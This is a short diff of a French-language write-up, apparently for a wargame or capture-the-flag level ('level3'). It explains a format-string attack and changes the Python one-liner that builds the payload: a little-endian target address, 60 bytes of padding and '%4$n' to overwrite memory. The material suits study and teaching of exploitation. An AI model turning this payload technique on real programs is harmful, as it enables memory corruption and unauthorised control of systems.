@@ -26,5 +26,5 @@ Il faut donc qu'on utilise le %n qui permet de stocker le nombre de caractere du
 
 Donc, mettre l'adresse de 0x804988c en little-edian pour pouvoir la modifier, et ensuite mettre du padding pour arriver a 64 caracteres (0x40), suivi du %n !
 
-python -c 'import sys; sys.stdout.write("\x8c\x98\x04\x08" + "A"*60 + "%4$n\n")' > /tmp/test
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/test
 cat /tmp/test - | ./level3
